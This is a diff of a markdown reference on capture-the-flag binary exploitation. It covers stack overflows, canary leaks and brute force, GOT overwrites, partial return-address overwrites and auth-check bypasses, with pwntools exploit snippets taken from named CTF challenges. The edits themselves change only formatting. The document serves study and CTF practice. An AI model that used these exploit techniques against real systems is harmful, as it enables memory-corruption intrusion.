@@ -1,7 +1,6 @@
 # CTF Pwn - Overflow Basics
 
 ## Table of Contents
-
 - [Stack Buffer Overflow](#stack-buffer-overflow)
   - [ret2win with Parameter (Magic Value Check)](#ret2win-with-parameter-magic-value-check)
   - [Stack Alignment (16-byte Requirement)](#stack-alignment-16-byte-requirement)
@@ -26,7 +25,7 @@
 - [PIE Same-Page Function Pivot via Single-Byte Overwrite (P.W.N. CTF 2018)](#pie-same-page-function-pivot-via-single-byte-overwrite-pwn-ctf-2018)
 - [scanf Format-Error Skip for Canary Preservation (nullcon HackIM 2019)](#scanf-format-error-skip-for-canary-preservation-nullcon-hackim-2019)
 
-------
+---
 
 ## Stack Buffer Overflow
 
@@ -49,7 +48,6 @@ void win(long arg) {
 ```
 
 **Exploitation (x86-64):**
-
 ```python
 from pwn import *
 
@@ -69,7 +67,6 @@ payload += p64(win_func)
 ```
 
 **Finding the win function:**
-
 - Search for `fopen("flag.txt")` or similar in Ghidra
 - Look for functions with no XREF that check a magic parameter
 - Check for conditional print/exit patterns after parameter comparison
@@ -77,12 +74,10 @@ payload += p64(win_func)
 ### Stack Alignment (16-byte Requirement)
 
 Modern Ubuntu/glibc requires 16-byte stack alignment before `call` instructions. Symptoms of misalignment:
-
 - SIGSEGV in `movaps` instruction (SSE requires alignment)
 - Crash inside libc functions (printf, system, etc.)
 
 **Fix:** Add extra `ret` gadget before your ROP chain:
-
 ```python
 payload = b"A" * offset
 payload += p64(ret)        # Align stack to 16 bytes
@@ -102,7 +97,6 @@ mov    $0xf0,%edx        ; read() size = 240 (overflow!)
 ```
 
 **Calculate offset:**
-
 - Buffer starts at `rbp - buffer_offset` (e.g., rbp-0x70)
 - Saved RBP is at `rbp` (0 offset from buffer end)
 - Return address is at `rbp + 8`
@@ -111,7 +105,6 @@ mov    $0xf0,%edx        ; read() size = 240 (overflow!)
 ### Input Filtering (memmem checks)
 
 Some challenges filter input using `memmem()` to block certain strings:
-
 ```python
 payload = b"A" * 120 + p64(gadget) + p64(value)
 assert b"badge" not in payload and b"token" not in payload
@@ -155,7 +148,6 @@ for addr, gadget in rop.gadgets.items():
 **Pattern:** Menu-based programs with create/modify/delete/view operations on structs containing both data buffers and pointers. The modify/edit function reads more bytes than the data buffer, overflowing into adjacent pointer fields.
 
 **Struct layout example:**
-
 ```c
 struct Student {
     char name[36];      // offset 0x00 - data buffer
@@ -165,7 +157,6 @@ struct Student {
 ```
 
 **Exploitation:**
-
 ```python
 from pwn import *
 
@@ -186,16 +177,15 @@ modify_grade(0, str(WIN))  # Writes win addr as int to GOT entry
 ```
 
 **GOT target selection strategy:**
-
 - Identify which libc functions the `win` function calls internally
 - Do NOT overwrite GOT entries for functions used by `win` (causes infinite recursion/crash)
 - Prefer functions called in the main loop AFTER the write
 
-| Win uses                         | Safe GOT targets                     |
-| -------------------------------- | ------------------------------------ |
+| Win uses | Safe GOT targets |
+|----------|-------------------|
 | puts, fopen, fread, fclose, exit | printf, free, getchar, malloc, scanf |
-| printf, system                   | puts, exit, free                     |
-| system only                      | puts, printf, exit                   |
+| printf, system | puts, exit, free |
+| system only | puts, printf, exit |
 
 ## Signed Integer Bypass (Negative Quantity)
 
@@ -210,7 +200,6 @@ Overflow `valid` flag between buffer and canary without touching the canary. Use
 **Pattern (ByteCrusher):** A string processing function walks input buffer with configurable stride (`rate`). When rate exceeds buffer size, it skips over the null terminator and reads adjacent stack data (canary, return address).
 
 **Stack layout:**
-
 ```text
 input_buf  [0-31]    <- user input (null at byte 31)
 crushed    [32-63]   <- output buffer
@@ -220,7 +209,6 @@ return addr [88-95]  <- code pointer (defeats PIE)
 ```
 
 **Vulnerable pattern:**
-
 ```c
 void crush_string(char *input, char *output, int rate, int output_max_len) {
     for (int i = 0; input[i] != '\0' && out_idx < output_max_len - 1; i += rate) {
@@ -230,7 +218,6 @@ void crush_string(char *input, char *output, int rate, int output_max_len) {
 ```
 
 **Exploitation:**
-
 ```python
 from pwn import *
 
@@ -271,7 +258,6 @@ p.sendline(payload)
 **Canary structure:** First byte is always `\x00` (prevents string function leaks). Remaining 7 bytes are random. Total: 8 bytes on x86-64, 4 on x86-32.
 
 **Exploitation:**
-
 ```python
 from pwn import *
 
@@ -314,7 +300,6 @@ p.sendline(payload)
 ```
 
 **Prerequisites:**
-
 - Server must `fork()` per connection (canary stays constant across children)
 - Overflow must be controllable byte-by-byte (no all-at-once read)
 - Distinguishable crash vs success response (timeout, error message, or connection behavior)
@@ -323,13 +308,13 @@ p.sendline(payload)
 
 **Key insight:** `fork()` preserves the canary across child processes. Brute-forcing 8 bytes sequentially (7 * 256 = 1792 attempts) is vastly more efficient than brute-forcing all 8 bytes simultaneously (2^56 attempts).
 
-------
+---
 
 ## Global Buffer Overflow (CSV Injection)
 
 **Pattern (Spreadsheet):** Overflow adjacent global variables via extra CSV delimiters to change filename pointer. See [advanced.md](advanced.md) for full exploit pattern.
 
-------
+---
 
 ## Protocol Length Field Stack Bleeding (EKOPARTY CTF 2016)
 
@@ -366,7 +351,7 @@ for i in range(0, len(leaked) - 8, 8):
 
 **Key insight:** Any protocol where the server uses a client-supplied length to determine how much data to return is vulnerable to overread attacks. The server reads beyond the actual buffer into adjacent stack/heap memory, leaking sensitive data including flags, addresses, and canaries.
 
-------
+---
 
 ## Parser Stack Overflow via Unchecked memcpy Length (MetaCTF Flash 2026)
 
@@ -443,7 +428,6 @@ p.interactive()
 **Key insight:** Custom file parsers often allocate fixed-size stack buffers based on a "maximum expected size" but the file format allows specifying larger records. The `memcpy` happens before the length check, creating a classic stack overflow. When exploiting, you must restore callee-saved registers to valid values in the overflow payload -- the function epilogue pops them before returning, and invalid values cause crashes before the return address is reached. Common requirements: `rbx` must point to readable memory (use BSS), loop counter registers must satisfy exit conditions.
 
 **Callee-saved register restoration checklist:**
-
 1. Identify which registers the function pushes in its prologue (`push rbx`, `push r12`, etc.)
 2. Determine the order they are restored in the epilogue (reverse of push order)
 3. Set `rbx` to any readable address (BSS, GOT, or known mapped page)
@@ -454,23 +438,20 @@ p.interactive()
 
 **References:** MetaCTF Flash CTF 2026 "PCAP Trap"
 
-------
+---
 
 ## Stack Canary Null-Byte Overwrite Leak (CSAW 2017)
 
 **Pattern:** Stack canaries always end with a null byte (the low byte is `\x00`) to prevent string-based leaks. If an overflow allows overwriting just that null byte with a non-null character, `puts()` or `printf("%s")` will continue printing past the overwritten byte and output the remaining 7 canary bytes. A return-to-main provides a second exploitation stage where the full canary is known.
 
 **Stack layout:**
-
 ```text
 [buffer] [canary \x00 XX XX XX XX XX XX XX] [saved rbp] [return addr]
                   ^--- overwrite only this byte with 'A'
                   → puts() now prints: 'A' + 7 canary bytes + (more stack data)
-
 ```
 
 **Exploitation:**
-
 ```python
 from pwn import *
 
@@ -485,7 +466,6 @@ log.info(f"Leaked canary: {hex(canary_val)}")
 # Stage 2: Return-to-main for clean second exploitation
 # First stage payload returned to main() — now build full ROP chain
 p.send(b'A' * buf_size + canary + p64(0) + p64(win_addr))
-
 ```
 
 **Why return-to-main:** After leaking the canary by overwriting its null byte, the canary is corrupted — the process will crash on return. Return-to-main (via a first-stage overflow) resets the stack frame cleanly and allows a second input with the now-known canary value.
@@ -494,20 +474,18 @@ p.send(b'A' * buf_size + canary + p64(0) + p64(win_addr))
 
 **References:** CSAW 2017
 
-------
+---
 
 ## Empty-Token strncmp(n=0) MAC Bypass (UCSB iCTF 2018)
 
 **Pattern:** A MAC or auth token check extracts `n` (comparison length) from a user-supplied field and then calls `strncmp(expected, supplied, n)`. When `n == 0`, `strncmp` returns 0 regardless of input — every token is accepted.
 
 **Vulnerable code:**
-
 ```c
 int n = atoi(user_len);            // attacker controls length
 if (strncmp(expected_mac, user_mac, n) == 0) {
     grant_access();
 }
-
 ```
 
 **Exploit:** Send the token with `len=0` (or a length field that parses to zero) and an arbitrary MAC.
@@ -516,7 +494,7 @@ if (strncmp(expected_mac, user_mac, n) == 0) {
 
 **References:** UCSB iCTF 2018 — writeup 10009
 
-------
+---
 
 ## Return Address LSB Overwrite + read() Chaining (TUCTF 2018)
 
@@ -529,14 +507,13 @@ p.sendline(payload)
 
 # Second read call now reads into &password with length 0x2b
 p.send(p32(0) + p32(password_addr) + p32(0x2b))
-
 ```
 
 **Key insight:** A one-byte ret overwrite reused as a "call this function again" primitive is often stronger than a full ROP, because you bypass ASLR entirely — you jump to an instruction already at a known relative offset.
 
 **References:** TUCTF 2018 — Lisa, writeup 12339
 
-------
+---
 
 ## Canary Trailing-Byte Leak via Padding One Byte Past Null (hxp 2018)
 
@@ -546,14 +523,13 @@ p.send(p32(0) + p32(password_addr) + p32(0x2b))
 p.send(b'A' * (buf_size + 1))
 leaked = p.recvline().rstrip(b'\n')
 canary = b'\x00' + leaked[buf_size:]     # reconstruct full 4-byte canary
-
 ```
 
 **Key insight:** The canary byte that makes it "safe" against string operations is also the byte that enables the leak — replace it with a non-null byte, and the echo spills everything up to the next null.
 
 **References:** hxp CTF 2018 — poor_canary, writeup 12568
 
-------
+---
 
 ## Index-Only Bounds Check + Stride OOB Write (P.W.N. CTF 2018)
 
@@ -561,7 +537,6 @@ canary = b'\x00' + leaked[buf_size:]     # reconstruct full 4-byte canary
 
 ```c
 if (v2 <= 0xFC) read(0, &array[12*v2], 0xC);   // bug: stride unchecked
-
 ```
 
 Set `v2 = 0xFB` to write 12 bytes at offset `12 * 0xFB = 0xBC4` past the array base.
@@ -570,7 +545,7 @@ Set `v2 = 0xFB` to write 12 bytes at offset `12 * 0xFB = 0xBC4` past the array b
 
 **References:** P.W.N. CTF 2018 — Exploitation Class / Kindergarten PWN, writeup 12041
 
-------
+---
 
 ## Signed Index Negative OOB to Preceding GOT (P.W.N. CTF 2018)
 
@@ -579,7 +554,6 @@ Set `v2 = 0xFB` to write 12 bytes at offset `12 * 0xFB = 0xBC4` past the array b
 ```c
 int v5 = atoi(input);     // signed
 if (v5 <= 31) table[v5] = new_value;   // writes to table[-N]
-
 ```
 
 Use negative indices to first leak libc (`read` GOT) and then overwrite a free GOT entry with `system`.
@@ -588,7 +562,7 @@ Use negative indices to first leak libc (`read` GOT) and then overwrite a free G
 
 **References:** P.W.N. CTF 2018 — Kindergarten PWN, writeup 12041
 
-------
+---
 
 ## PIE Same-Page Function Pivot via Single-Byte Overwrite (P.W.N. CTF 2018)
 
@@ -596,14 +570,13 @@ Use negative indices to first leak libc (`read` GOT) and then overwrite a free G
 
 ```python
 p.send(b'A' * overflow_to_fp + b'\xa9')
-
 ```
 
 **Key insight:** PIE randomises only page-aligned bits. Any two code addresses that share a page differ exclusively in the low 12 bits, so a single-byte overwrite is an ASLR-free partial overwrite whenever you can land the victim function in the same page during compilation.
 
 **References:** P.W.N. CTF 2018 — Important Service, writeup 12041
 
-------
+---
 
 ## scanf Format-Error Skip for Canary Preservation (nullcon HackIM 2019)
 
@@ -631,7 +604,6 @@ target.sendline('0')              # saved libc_csu_init slot - scratch
 target.sendline('0')
 target.sendline(str(0x400806))    # return address -> main() for stage 2
 target.sendline(str(0))
-
 ```
 
 **Key insight:** `scanf("%d", ...)` treats a lone `-` as a format mismatch — it returns early without writing to the destination and, crucially, without consuming the `-` byte; the next scanf call will then fail identically. Using this skip primitive you can surgically choose which iterations of a "fixed-count" write loop actually land on the stack, letting you hop over canary/RBP slots to reach the return address. Combine with a signed/unsigned char comparison bug to get a loop count larger than the declared max.
